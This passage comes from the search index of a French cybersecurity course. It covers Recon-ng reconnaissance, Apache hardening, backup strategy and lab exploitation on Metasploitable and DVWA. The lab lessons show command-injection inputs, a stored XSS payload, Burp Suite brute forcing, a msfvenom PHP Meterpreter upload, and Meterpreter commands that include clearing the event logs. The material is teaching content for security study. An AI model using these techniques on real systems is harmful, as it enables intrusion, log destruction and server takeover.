l'information sur le module :</p> <p><code>info</code></p> <p>Commencer par voir la liste des options :</p> <p><code>options list</code></p> <p>Ex\u00e9cuter le module :</p> <p><code>run</code></p> <p>Avec le module whois_miner, la d\u00e9couverte des contacts ajoute les \u00e9l\u00e9ments dans la BD. Pour voir la liste des contacts :</p> <p><code>db query select * from contacts</code></p> <p>Pour faire le suivi de notre reconnaissance, utiliser la commande suivante :</p> <p><code>dashboard</code></p> <p>Voici quelques modules int\u00e9ressants :</p> <ul> <li>whois_pocs</li> <li>brute_hosts</li> <li>recon/hosts-hosts/resolve</li> </ul> <p>Recon-ng permet de faire des rapports :</p> <p>Module: reporting/html</p>"},{"location":"lecons/Reconnaissance_passive/#recherche-de-surfaces-dattaque-en-analysant-le-code-source-de-pages-web","title":"Recherche de surfaces d'attaque en analysant le code source de pages web","text":"<p>Ex: Site de Christiane</p> <p>Dans le code source, on peut voir :</p> <p><code>wp-content</code></p> <p>C'est un indicatif que le site est fait avec WordPress.</p>"},{"location":"lecons/Reconnaissance_passive/#testez-vos-connaissances","title":"Testez vos connaissances","text":"<p>Petit quiz sur la reconnaissance passive </p>"},{"location":"lecons/Reconnaissance_passive/#lectures-supplementaires","title":"Lectures suppl\u00e9mentaires","text":"<p>Outils d'intelligence ouverte - OSINT Tutoriel de Recon-ng Autres outils de recherche de sous-domaines Tutoriel Google Dorks et Hacks </p>"},{"location":"lecons/Securiser_Apache/","title":"S\u00e9curiser un serveur Web Apache","text":"<p>Ce cours explique une mani\u00e8re de s\u00e9curiser un serveur Web (dans ce cas-ci Apache) pour que ce soit plus difficile aux pirates d'en d\u00e9couvrir les vuln\u00e9rabilit\u00e9s et par le fait m\u00eame de le p\u00e9n\u00e9trer.  </p>"},{"location":"lecons/Securiser_Apache/#fichier-de-configuration-dapache","title":"Fichier de configuration d'Apache","text":"<p>Information</p> <p>Selon la version d'Apache, le fichier de configuration peut \u00eatre diff\u00e9rent. Pour la version utilis\u00e9e dans Metasploitable, le fichier se retrouve dans <code>/etc/apache2/apache2.conf</code>. \u00c0 titre de r\u00e9f\u00e9rence, l'appellation fichier de configuration sera employ\u00e9 dans le reste du document.</p>"},{"location":"lecons/Securiser_Apache/#cacher-la-version-dapache","title":"Cacher la version d'Apache","text":"<p>Il est bien utile pour un pirate de conna\u00eetre la version du serveur Web. Avec les bases de donn\u00e9es de CVE, trouver les vuln\u00e9rabilit\u00e9s est un jeu d'enfant.</p> <p>V\u00e9rification dans Firefox</p> <p> Il est simple de d\u00e9couvrir la version d'Apache et de PHP \u00e0 l'aide d'un fureteur.  </p> <p>Dans le fichier de configuration de s\u00e9curit\u00e9 (<code>/etc/apache2/conf-enabled/security.conf</code>), changer ces deux instructions :  </p> <pre><code>ServerTokens Prod\nServerSignature Off\n</code></pre> <p>Red\u00e9marrer le serveur :  </p> <p><code>sudo /etc/init.d/apache2 restart</code> </p> <p>V\u00e9rification dans Firefox apr\u00e8s le changement</p> <p> On ne voit maintenant que Apache.  </p>"},{"location":"lecons/Securiser_Apache/#cacher-la-version-de-php","title":"Cacher la version de PHP","text":"<p>Comme pour la version d'Apache, il est fortement recommand\u00e9 de cacher la version de PHP.  </p> <p>Les fichier de configuration PHP se trouvent dans <code>/etc/php/7.3/apache2/php.ini</code> et <code>/etc/php/7.3/cgi/php.ini</code>.</p> <p>Dans les fichiers de configuration de PHP, changer la ligne suivante :  </p> <pre><code>expose_php = Off\n</code></pre> <p>Red\u00e9marrer le serveur.</p> <p>V\u00e9rification dans Firefox apr\u00e8s le changement</p> <p> On ne voit plus la mention PHP.  </p>"},{"location":"lecons/Securiser_Apache/#desactiver-le-parcours-de-la-liste-des-fichiers","title":"D\u00e9sactiver le parcours de la liste des fichiers","text":"<p>Le parcours de la liste de fichiers est une option qui permet d'afficher le contenu d'un r\u00e9pertoire lorsqu'il n'y a pas de fichier repr\u00e9sentant une page Web, tel que <code>index.html</code> ou <code>index.php</code>.  </p> <p>Parcours d'un r\u00e9pertoire avec Firefox</p> <p> On peut y d\u00e9couvrir des tr\u00e9sors!  </p> <p>Pour toutes les instructions Directory qui se trouvent dans les fichiers du r\u00e9pertoire <code>/etc/apache2/sites-enabled</code> ou <code>/etc/apache2/apache2.conf</code> :  </p> <p><pre><code>&amp;lt;Directory /var/www&gt;\nOptions -Indexes\n&amp;lt;/Directory&gt;\n</code></pre> Red\u00e9marrer le serveur.  </p> <p>Parcours d'un r\u00e9pertoire avec Firefox apr\u00e8s le changement</p> <p> On ne peut plus acc\u00e9der \u00e0 un r\u00e9pertoire.  </p>"},{"location":"lecons/Securiser_Apache/#proteger-les-fichiers-de-configuration","title":"Prot\u00e9ger les fichiers de configuration","text":"<p>Par d\u00e9faut, les fichiers de configuration d'Apache peuvent \u00eatre consult\u00e9s par tous les utilisateurs du syst\u00e8me (644). Il est recommand\u00e9 d'enlever ce droit (640).  </p> <p>Liste des fichiers du r\u00e9pertoire de configuration</p> <p> Notez les droits : rw-r--r--  </p> <p>Pour enlever les droits aux utilisateurs :  </p> <pre><code>cd /etc/apache2  \nsudo chmod -R 640 .  \n</code></pre> <p>Liste des fichiers du r\u00e9pertoire de configuration apr\u00e8s le changement</p> <p> Les droits sont maintenant rw-r-----  </p>"},{"location":"lecons/Securiser_Apache/#proteger-les-configurations-contre-le-surclassement","title":"Prot\u00e9ger les configurations contre le surclassement","text":"<p>Malgr\u00e9 les configurations faites par l'administrateur, les utilisateurs peuvent en modifier certaines \u00e0 l'aide de fichiers <code>.htaccess</code>. Il est recommand\u00e9 de d\u00e9sactiver cette fonctionnalit\u00e9.  </p> <p>Trouver l'instruction Directory qui repr\u00e9sente la racine du site, qui se trouvent dans un des fichiers du r\u00e9pertoire <code>/etc/apache2/sites-enabled</code> :  </p> <p><pre><code>&amp;lt;Directory /&gt;\nAllowOverride None  \n&amp;lt;/Directory&gt;\n</code></pre> Red\u00e9marrer le serveur.  </p>"},{"location":"lecons/Securiser_Apache/#les-methodes-de-requetes-http","title":"Les m\u00e9thodes de requ\u00eates HTTP","text":"<p>Les serveurs Web supportent beaucoup de m\u00e9thodes HTTP qui ne sont pas n\u00e9cessaires en g\u00e9n\u00e9ral et peuvent \u00eatre dangeureuses.  </p> <p>Normalement, on peut limiter les m\u00e9thodes \u00e0 GET, POST, HEAD.  </p> <p>Pour toutes les instructions Directory qui se trouvent dans les fichiers du r\u00e9pertoire <code>/etc/apache2/sites-enabled</code>  ou <code>/etc/apache2/apache2.conf</code> :  </p> <pre><code>&amp;lt;Directory /var/www&gt;  \n  &amp;lt;LimitExcept GET POST HEAD&gt;  \n    deny from all\n  &amp;lt;/LimitExcept&gt;  \n&amp;lt;/Directory&gt;  \n</code></pre> <p>Red\u00e9marrer le serveur.  </p>"},{"location":"lecons/Securiser_Apache/#testez-vos-connaissances","title":"Testez vos connaissances","text":"<p>Petit quiz sur la s\u00e9curisation d'Apache </p>"},{"location":"lecons/Strategies_sauvegarde/","title":"Strat\u00e9gies de sauvegarde","text":""},{"location":"lecons/Strategies_sauvegarde/#pourquoi-sauvegarder","title":"Pourquoi sauvegarder","text":"<p>La sauvegarde est n\u00e9cessaire pour r\u00e9cup\u00e9rer un fichier, un dossier ou un syst\u00e8me complet dans les situations suivantes:</p> <ul> <li>Suppression accidentelle d'un fichier</li> <li>Corruption d'un fichier</li> <li>Installation d'une rustine qui rend instable un syst\u00e8me</li> <li>Corruption de disque</li> <li>Infestation de virus</li> <li>Donn\u00e9es crypt\u00e9es par un cryptovirus</li> </ul>"},{"location":"lecons/Strategies_sauvegarde/#types-de-sauvegarde","title":"Types de sauvegarde","text":"Type Description Complet Prend une image d'absolument tout Incr\u00e9mental Prend ce qui a chang\u00e9 depuis la derni\u00e8re sauvegarde Diff\u00e9rentiel Prend ce qui a chang\u00e9 depuis la derni\u00e8re sauvegarde compl\u00e8te"},{"location":"lecons/Strategies_sauvegarde/#sauvegarde-complete","title":"Sauvegarde compl\u00e8te","text":"<p>Dans ce sc\u00e9nario, une sauvegarde compl\u00e8te est fait chaque jour. Disons que les donn\u00e9es sauvegard\u00e9es prennent 10 gb et que le temps de sauvegarde est de 2 heures. Apr\u00e8s 7 jours, c'est donc 70 gb d'espace qui est requis.</p> <p>Avantages : - Besoin d'une seule sauvegarde lors de la restauration.  </p> <p>Inconv\u00e9nients : - Besoin \u00e9norme d'espace de sauvegarde - Temps de sauvegarde tr\u00e8s grand - Impossible de faire plus d'une sauvegarde par jour  </p>"},{"location":"lecons/Strategies_sauvegarde/#sauvegarde-complete-avec-incremental","title":"Sauvegarde compl\u00e8te avec incr\u00e9mental","text":"<p>Dans ce sc\u00e9nario, une sauvegarde compl\u00e8te est faite une fois par semaine, les autres jours, une sauvegarde incr\u00e9mentale est faite.</p> <p>Poids de la sauvegarde : Complet : 10 gb Incr\u00e9mental : 1 gb chaque jour Total : 16 gb par semaine  </p> <p>La restauration doit \u00eatre faite \u00e0 partir du complet et de tous les incr\u00e9mentals. Ex:</p> <p>Vendredi matin, le serveur doit \u00eatre restaur\u00e9. On doit prendre la sauvegarde du dimanche (le complet) et ceux du lundi, mardi, mercredi, jeudi et vendredi.</p> <p>Avantages : - Besoin de moins d'espace de sauvegarde - La sauvegarde incr\u00e9mentale est plus rapide  </p> <p>Inconv\u00e9nients : - Temps de restauration tr\u00e8s long - Plus de risque de corruption d'une sauvegarde  </p>"},{"location":"lecons/Strategies_sauvegarde/#sauvegarde-complete-avec-differentiel","title":"Sauvegarde compl\u00e8te avec diff\u00e9rentiel","text":"<p>Dans ce sc\u00e9nario, une sauvegarde compl\u00e8te est faite une fois par semaine, les autres jours, une sauvegarde diff\u00e9rentielle est faite.</p> <p>Poids de la sauvegarde :</p> <p>Complet : 10 gb</p> <p>Diff\u00e9rentiel :</p> Jour Poids de la sauvegarde 1 1 gb 2 2 gb 3 3 gb 4 4 gb 5 5 gb 6 6 gb <p>Total : 31 gb par semaine</p> <p>La restauration doit \u00eatre faite \u00e0 partir du complet et du dernier diff\u00e9rentiel. Ex:</p> <p>Vendredi matin, le serveur doit \u00eatre restaur\u00e9. On doit prendre la sauvegarde du dimanche (le complet) et celui du  vendredi.</p> <p>Avantages : - Besoin de moins d'espace de sauvegarde que le complet seulement - La sauvegarde diff\u00e9rentielle est plus rapide que le complet - Temps de restauration moins long que l'int\u00e9gral  </p> <p>Inconv\u00e9nients : - Temps de restauration plus long que le complet - Plus de risque de corruption d'une sauvegarde  </p>"},{"location":"lecons/Strategies_sauvegarde/#comment-choisir-la-strategie-de-sauvegarde","title":"Comment choisir la strat\u00e9gie de sauvegarde","text":"<p>Voici quelques points \u00e0 consid\u00e9rer lors de l'analyse du besoin de sauvegarde :  </p> <ol> <li>Capacit\u00e9 du m\u00e9dium de sauvegarde  </li> <li>Fr\u00e9quence de sauvegarde  </li> <li>R\u00e9tention des sauvegardes  </li> <li>RTO (Recovery time objective)  </li> <li>RPO (Recovery point objective)  </li> </ol>"},{"location":"lecons/Strategies_sauvegarde/#rto-vs-rpo","title":"RTO vs RPO","text":""},{"location":"lecons/Strategies_sauvegarde/#1-rpo-recovery-point-objective","title":"1. RPO (Recovery Point Objective) :","text":"<ul> <li>D\u00e9finition : Le RPO repr\u00e9sente la p\u00e9riode maximale pendant laquelle des donn\u00e9es peuvent \u00eatre perdues en cas de panne.</li> <li>Dans ce contexte : \u00c9tant donn\u00e9 que le serveur est sauvegard\u00e9 une fois par jour, le RPO peut atteindre jusqu'\u00e0 24 heures. Cela signifie que toutes les donn\u00e9es modifi\u00e9es entre la derni\u00e8re sauvegarde et le moment du crash risquent d'\u00eatre perdues.</li> </ul>"},{"location":"lecons/Strategies_sauvegarde/#2-rto-recovery-time-objective","title":"2. RTO (Recovery Time Objective) :","text":"<ul> <li>D\u00e9finition : Le RTO est le temps maximal acceptable pour restaurer le syst\u00e8me apr\u00e8s une panne et reprendre les op\u00e9rations normales.</li> <li>Dans ce contexte : Il s'agit du temps \u00e9coul\u00e9 entre le crash du serveur et le moment o\u00f9 le syst\u00e8me est pleinement op\u00e9rationnel apr\u00e8s la restauration. Par exemple, si la restauration prend 7 heures, alors le RTO est de 7 heures.</li> </ul>"},{"location":"lecons/Strategies_sauvegarde/#scenario-detaille","title":"Sc\u00e9nario d\u00e9taill\u00e9 :","text":"<ol> <li>Sauvegarde quotidienne : Le serveur effectue une sauvegarde compl\u00e8te chaque jour \u00e0 une heure fixe (par exemple, \u00e0 minuit).</li> <li>Crash du serveur : Une panne survient \u00e0 un moment impr\u00e9vu (par exemple, \u00e0 15h00).</li> <li>Perte de donn\u00e9es (RPO) : Les donn\u00e9es cr\u00e9\u00e9es ou modifi\u00e9es entre la derni\u00e8re sauvegarde (minuit) et le crash (15h00) peuvent \u00eatre perdues.</li> <li>Restauration du syst\u00e8me (RTO) : Le temps n\u00e9cessaire pour restaurer le serveur \u00e0 partir de la derni\u00e8re sauvegarde et remettre le syst\u00e8me en service (par exemple, de 15h00 \u00e0 22h00).</li> </ol>"},{"location":"lecons/Strategies_sauvegarde/#conclusion","title":"Conclusion :","text":"<ul> <li>RPO (15 heures dans cet exemple) : Indique la quantit\u00e9 maximale de donn\u00e9es susceptibles d'\u00eatre perdues.</li> <li>RTO (7 heures dans cet exemple) : Indique le temps maximal pour r\u00e9tablir le service apr\u00e8s une panne.</li> </ul> <p>Remarque : Pour r\u00e9duire le RPO et le RTO, vous pourriez envisager des strat\u00e9gies telles que des sauvegardes plus fr\u00e9quentes, la mise en place de syst\u00e8mes redondants ou l'utilisation de solutions de r\u00e9cup\u00e9ration d'urgence avanc\u00e9es.</p>"},{"location":"lecons/Strategies_sauvegarde/#scenario-1","title":"Sc\u00e9nario 1","text":"<p>La compagnie X doit faire la sauvegarde d'un serveur de 20 gb. La compagnie a une capacit\u00e9 de sauvegarde de 1 tb. Un requis est de conserver les sauvegardes 30 jours.</p> Point Valeur Capacit\u00e9 1 tb = 50 sauvegardes Fr\u00e9quence 1 fois par jour R\u00e9tention 30 jours RTO Non mentionn\u00e9 RPO Non mentionn\u00e9 <p>Suggestion :</p> <p>Comme la compagnie a la capacit\u00e9 de conserver au moins 30 sauvegardes compl\u00e8tes, il est pr\u00e9f\u00e9rable de faire une sauvegarde compl\u00e8te \u00e0 chaque jour, pour r\u00e9duire le RTO.</p>"},{"location":"lecons/Strategies_sauvegarde/#scenario-2","title":"Sc\u00e9nario 2","text":"<p>La compagnie Y doit faire la sauvegarde d'un serveur de 20 gb. Elle est ouverte de 8h \u00e0 17h. Elle veut ne perdre qu'au maximum 4 heures de donn\u00e9es dans la journ\u00e9e. Il y a environ 2% de donn\u00e9es modifi\u00e9es par jour et 1 gb de nouvelles donn\u00e9es par semaine. Un requis est de conserver les sauvegardes 90 jours. Une sauvegarde compl\u00e8te prend 2 heures.</p> Point Valeur Capacit\u00e9 Non mentionn\u00e9e Fr\u00e9quence 1 fois par jour R\u00e9tention 90 jours RTO Non mentionn\u00e9 RPO 4h <p>Suggestion :</p> <p>Le point important est la mention de la perte de donn\u00e9es de moins de 4 heures. Comme la compagnie travaille de 8h \u00e0 17h, il y a donc 8 heures de travail. Une sauvegarde par jour n'est pas suffisante. La sauvegarde compl\u00e8te prend 2 heures, trop long pour l'heure du lunch. Dans ce cas, je proposerais une sauvegarde compl\u00e8te tous les soirs et une sauvegarde incr\u00e9mentale le midi.</p>"},{"location":"lecons/Strategies_sauvegarde/#medium-de-sauvegarde","title":"M\u00e9dium de sauvegarde","text":"M\u00e9dium Co\u00fbts Vitesse Accessibilit\u00e9 Protection en cas de feu NAS $$ +++ Toujours Non HDD Externe $ ++ Quand connect\u00e9 Quand entrepos\u00e9 hors du b\u00e2timent Librairie de rubans $$ ++ Quand le ruban est dans le lecteur Quand entrepos\u00e9 hors du b\u00e2timent Infonuagique $$ + Toujours Oui"},{"location":"lecons/Strategies_sauvegarde/#strategie-typique","title":"Strat\u00e9gie typique","text":"<p>La strat\u00e9gie d'une entreprise s\u00e9rieuse et de m\u00e9langer deux m\u00e9diums ou plus.</p> <p>Par exemple :</p> <p>Sauvegarde aux heures dans le NAS. Sauvegarde tous les soirs sur ruban.</p>"},{"location":"lecons/Strategies_sauvegarde/#strategie-de-lattaquant","title":"Strat\u00e9gie de l'attaquant","text":"<p>Les hackers modernes qui ciblent les entreprises ont d\u00e9velopp\u00e9 une strat\u00e9gie efficace contre les sauvegardes.</p> <p>Il y a quelques ann\u00e9es, lorsqu'une entreprise subissait une attaque de cryptovirus, les TI faisaient un formatage complet et une restauration \u00e0 partir de la derni\u00e8re sauvegarde. Les hackers ont appris et dans leurs protocoles d'attaque, ils s'assurent que tous les sauvegardes soient d\u00e9truites avant de lancer l'attaque, obligeant l'entreprise \u00e0 payer pour la cl\u00e9 de d\u00e9cryption.</p> <p>Dans un but de pr\u00e9venir ce genre d'attaque, il est fortement recommand\u00e9 d'avoir un type de sauvegarde hors ligne, qui ne peut \u00eatre accessible que physiquement. Ce peut \u00eatre un ruban qu'on retire du lecteur \u00e0 tous les jours ou un disque dur externe qui n'est connect\u00e9 que lors de la sauvegarde. Le NAS et l'infonuagique peuvent \u00eatre compromis \u00e0 distance.</p>"},{"location":"lecons/Strategies_sauvegarde/#testez-vos-connaissances","title":"Testez vos connaissances","text":"<p>Petit quiz sur les strat\u00e9gies de sauvegarde </p>"},{"location":"lecons/Tests_penetration/","title":"Tests de p\u00e9n\u00e9tration","text":"<p>Les tests de p\u00e9n\u00e9tration sont effectu\u00e9s pour trouver la faille de la cible et en prendre contr\u00f4le.</p> <p>Dans Kali, nous utiliserons Metasploit.</p>"},{"location":"lecons/Tests_penetration/#exploits","title":"Exploits","text":"<p>Comme mentionn\u00e9 pr\u00e9c\u00e9demment, les pirates utilisent les faiblesses de la cible pour en prendre contr\u00f4le. C'est donc l'exploitation d'une vuln\u00e9rabilit\u00e9.</p> <p>Dans Metasploit, l'exploitation des vuln\u00e9rabilit\u00e9s se fait \u00e0 l'aide de modules de type exploits.  </p> <p>Pour rechercher un exploit, utiliser la commande suivante :  </p> <p><code>search type:exploit</code></p> <p></p> <p>Regardons quels services sont actifs sur la cible :  </p> <p><code>db_nmap -sS 192.168.40.5</code></p> <p></p> <p>Le port 445 correspond au service SMB. Regardons quel exploit peut \u00eatre utilis\u00e9 :</p> <p><code>search smb type:exploit os:windows</code> </p> <p></p> <p>Il y a plusieurs exploits possibles.</p> <p>Essayons quelques uns :  </p> <p></p> <p>La cible de cet exploit semble \u00eatre pour Windows XP SP3. Notre cible semble avoir Windows XP SP3 aussi.  </p> <p>Regardons les infos :  </p> <p><code>info</code></p> <p></p> <p>Ce module requiert l'installation d'un th\u00e8me sur le poste... Continuons \u00e0 chercher :  </p> <p></p> <p>Et son info :  </p> <p></p> <p>Essayons-le :</p> <p></p> <p>Cet exploit n'a pas march\u00e9, passons au suivant :  </p> Exploit qui marche en Windows, mais pas sur MacOS. <p>  Lan\u00e7ons l'ex\u00e9cution :  C'est un succ\u00e8s!!!</p> Exploit qui marche en MacOS <p>  Lan\u00e7ons l'ex\u00e9cution :  C'est un succ\u00e8s!!!  </p>"},{"location":"lecons/Tests_penetration/#meterpreter","title":"Meterpreter","text":"<p>Meterpreter est un payload qui utilise un m\u00e9canisme d'injection de DLL en m\u00e9moire et donne un puissant outil qui roule sur le syst\u00e8me de la victime.</p> <p>Pour commencer, il y a une aide contextuelle dans Meterpreter :</p> <p><code>help</code></p> <p></p> <p><code>background</code></p> <p>Permet de retourner \u00e0 Metasploit. Pour revenir \u00e0 la session Meterpreter, utiliser</p> <p><code>sessions -i 1</code></p> <p></p> <p><code>cat</code></p> <p>Pour afficher le contenu d'un fichier :</p> <p></p> <p><code>cd</code> pour changer de r\u00e9pertoire :</p> <p></p> <p><code>pwd</code> indique le r\u00e9pertoire courant :  </p> <p></p> <p><code>clearev</code> vide les historiques de Windows (Application, Syst\u00e8me et s\u00e9curit\u00e9)</p> <p>Event Viewer avant le m\u00e9nage :  </p> <p></p> <p>Lan\u00e7ons le m\u00e9nage :  </p> <p></p> <p>Event Viewer apr\u00e8s le m\u00e9nage :</p> <p></p> <p><code>download</code> pour t\u00e9l\u00e9charger un fichier de la machine cible</p> <p></p> <p><code>execute</code> D\u00e9marre une commande sur la cible</p> <p></p> <p><code>ls</code> Voir le contenu du r\u00e9pertoire courant</p> <p></p> <p><code>ps</code> Voir les processus qui roulent sur la cible  </p> <p></p> <p><code>search</code> Peut chercher \u00e0 travers tout le syst\u00e8me de fichier</p> <p></p> <p><code>shell</code> Pour avoir une ligne de commande de Windows (bon vieux DOS)</p> <p></p> <p><code>upload</code> Pour t\u00e9l\u00e9verser un fichier vers la cible</p> <p></p> <p>R\u00e9sultat :</p> <p></p> <p><code>screenshot</code> Prend une photo de l'\u00e9cran de la victime</p> <p></p> <p>R\u00e9sultat :  </p> <p></p> <p><code>reboot</code> Red\u00e9marre le syst\u00e8me de la cible</p>"},{"location":"lecons/Tests_penetration/#testez-vos-connaissances","title":"Testez vos connaissances","text":"<p>Petit quiz sur les tests de p\u00e9n\u00e9tration </p>"},{"location":"lecons/Vulnerabilites_Web/","title":"Vuln\u00e9rabilit\u00e9s Web","text":"<p>L'ensemble des d\u00e9monstrations de ce cours utilise une application Web nomm\u00e9e Damn Vulnerable Web Application ou DVWA. C'est une application avec des vuln\u00e9rabilit\u00e9s pour tester notre habilet\u00e9 \u00e0 les exploiter.</p>"},{"location":"lecons/Vulnerabilites_Web/#execution-de-commandes","title":"Ex\u00e9cution de commandes","text":"<p>Certaines applications Web utilisent les commandes du syst\u00e8me d'exploitation pour offrir des services aux utilisateurs. Un pirate peut prendre avantage de ces applications pour ex\u00e9cuter des commandes non pr\u00e9vues.</p> <p>Dans DVWA, aller dans la section Command Execution.</p> <p></p> <p>L'application permet de faire un ping.</p> <p>si on entre <code>192.168.40.7</code> :</p> <p></p> <p>Sous Linux, il est possible d'ex\u00e9cuter plusieurs commandes sur la m\u00eame ligne avec l'op\u00e9rateur &amp; ou |.</p> <p>Essayons de voir le contenu du r\u00e9pertoire courant avec <code>192.168.40.7 &amp; ls -la</code></p> <p></p> <p>Essayons de voir le contenu du r\u00e9pertoire courant avec <code>192.168.40.7 | ls -la</code></p> <p></p> <p>Nous nous trouvons dans quel r\u00e9pertoire? <code>192.168.40.7 | pwd</code></p> <p></p> <p>Quelle version de Linux roule? <code>192.168.40.7 | uname -a</code></p> <p>Cr\u00e9ons une nouvelle page Web : <code>192.168.40.7 | echo \"&lt;?php echo 'Salut la gang' ?&gt;\" &gt; salut.php</code></p> <p>Essayons de voir le contenu du r\u00e9pertoire courant apr\u00e8s la cr\u00e9ation du fichier avec <code>192.168.40.7 | ls -la</code></p> <p></p> <p>Ex\u00e9cutons la nouvelle page :</p> <p></p>"},{"location":"lecons/Vulnerabilites_Web/#source-de-la-vulnerabilite","title":"Source de la vuln\u00e9rabilit\u00e9","text":""},{"location":"lecons/Vulnerabilites_Web/#attaque-avec-une-force-brute","title":"Attaque avec une force brute","text":"<p>Certaines application Web sont susceptibles \u00e0 une attaque par force brute. Pour d\u00e9montrer comment faire une telle attaque, nous allons utiliser BurpSuite.</p> <p>Pour installer BurpSuite :</p> <p><code>sudo apt install burpsuite</code></p> <p>1 - Cr\u00e9er un projet temporaire :</p> <p></p> <p>2 - D\u00e9marrer Burp :</p> <p></p> <p>3 - Dans firefox, configurer le proxy :</p> <p></p> <p>4 - Dans firefox, acc\u00e9der \u00e0 la page de DVWA :</p> <p></p> <p>5 - Mettre intercept \u00e0 on dans Burpsuite :</p> <p></p> <p>6 - Dans firefox, entrer 'user1' et 'pass1' et cliquer sur login :</p> <p></p> <p>7 - Dans BurpSuite, s\u00e9lectionner l'action send to intruder :</p> <p></p> <p>8 - S\u00e9lectionner l'onglet intruder, le sous-onglet position et changer le type d'attaque pour cluster bomb :</p> <p></p> <p>9 - S\u00e9lectionner user1 et pass1 :</p> <p></p> <p>10 - Dans l'onglet payloads, ajouter les codes utilisateurs dans le payload 1 et les mots de passe dans le payload 2 :</p> <p></p> <p></p> <p>11 - Dans l'onglet options, ajouter un Grep - Match pour d\u00e9terminer si l'attaque a r\u00e9ussi ou non :</p> <p></p> <p>12 - Lancer l'attaque :</p> <p></p> <p>13 - R\u00e9sultats de l'attaque, nous avons trouv\u00e9 1 mot de passe valide :</p> <p></p>"},{"location":"lecons/Vulnerabilites_Web/#cross-site-scripting","title":"Cross Site Scripting","text":"<p>Les sites Web qui ont du contenu cr\u00e9\u00e9 par les utilisateurs (par exemple un forum) peuvent permettre l'ex\u00e9cution de code Javascript inject\u00e9 dans le contenu. De cette mani\u00e8re, un utilisateur malicieux peut ex\u00e9cuter du code sur le poste d'une victime lors de sa visite du site Web.</p> <p>1 - Aller sur la page de XSS (stored) dans DVWA :</p> <p></p> <p>2 - \u00c9crire le payload dans le message :</p> <p><code>&lt;script&gt;alert(\"Bonjour la plan\u00e8te\")&lt;/script&gt;</code></p> <p></p> <p>3 - R\u00e9sultats :</p> <p></p>"},{"location":"lecons/Vulnerabilites_Web/#upload","title":"Upload","text":"<p>Si vous pouvez t\u00e9l\u00e9verser un fichier sur le serveur, vous pouvez prendre contr\u00f4le du serveur.</p> <p>1 - Cr\u00e9er un fichier avec un payload \u00e0 l'aide de MSFVenom :</p> <p><code>msfvenom -p php/meterpreter/bind_tcp lport=4444 -o mp.php</code></p> <p></p> <p>2 - Aller sur la page upload de DVWA et t\u00e9l\u00e9verser mp.php :</p> <p></p> <p>3 - Ex\u00e9cuter le fichier mp.php :</p> <p></p> <p>4 - Lancer Metasploit avec le multi handler et le bon payload :</p> <p></p>"},{"location":"lecons/Vulnerabilites_Web/#testez-vos-connaissances","title":"Testez vos connaissances","text":"<p>Petit quiz sur les vuln\u00e9rabilit\u00e9s Web</p>"}]}